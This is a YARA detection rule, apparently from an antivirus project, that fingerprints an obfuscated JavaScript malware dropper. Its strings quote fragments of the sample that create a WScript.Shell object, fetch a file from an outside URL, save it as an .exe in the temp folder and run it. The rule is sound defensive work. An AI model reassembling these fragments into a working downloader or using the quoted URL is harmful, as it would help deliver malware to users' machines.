rule sig_20160330_aedc2b4f6fa3dc462d182e1070c207e2 {
  meta:
    description = "datamaliciousorder - file 20160330_aedc2b4f6fa3dc462d182e1070c207e2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1b5165ecfcfdc3a9477d247d94a89abb567ebd52421627d0f59bfb4a1f205ccf"

  strings:
    $s1  = "function U(RA, F2){SS = SS * 1; return RA - F2;};" fullword ascii
    $s2  = "var EG = function SX() {return WScript[CG](\"WScript\"+\".Shell\");}(), RS = 11;" fullword ascii
    $s3  = "ME[HE](\"GET\", \"http://tools24.nl/w8isa\", false);" fullword ascii
    $s4  = "if (ME[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EM(){return NT + \"\";};" fullword ascii
    $s6  = "function B() {return EG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"V3Wa3EjDoVXz7aSF.ex\" + \"e\";};" fullword ascii
    $s7  = "function WP() {return ((WZ == true) && (WZ == F1)) ? 1 : SS;};" fullword ascii
    $s8  = "function G(OU){EG[\"Run\"](OU, SS, SS);};" fullword ascii
    $s9  = "function I(){return 22;};" fullword ascii
    $s10 = "var F0 = new this[\"Date\"]();" fullword ascii
    $s11 = "return U(IF, P0);" fullword ascii
    $s12 = "function S(UQ) {var XE = (1, 2, 3, 4, 5, UQ); return XE;};" fullword ascii
    $s13 = "function P(){return CG;};" fullword ascii
    $s14 = "}while (JI);" fullword ascii
    $s15 = "var WZ = false;" fullword ascii
    $s16 = "WZ = true; " fullword ascii
    $s17 = "var F1 = false;" fullword ascii
    $s18 = "var P1 = false;" fullword ascii
    $s19 = "F1 = true; " fullword ascii
    $s20 = "} catch(U0){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}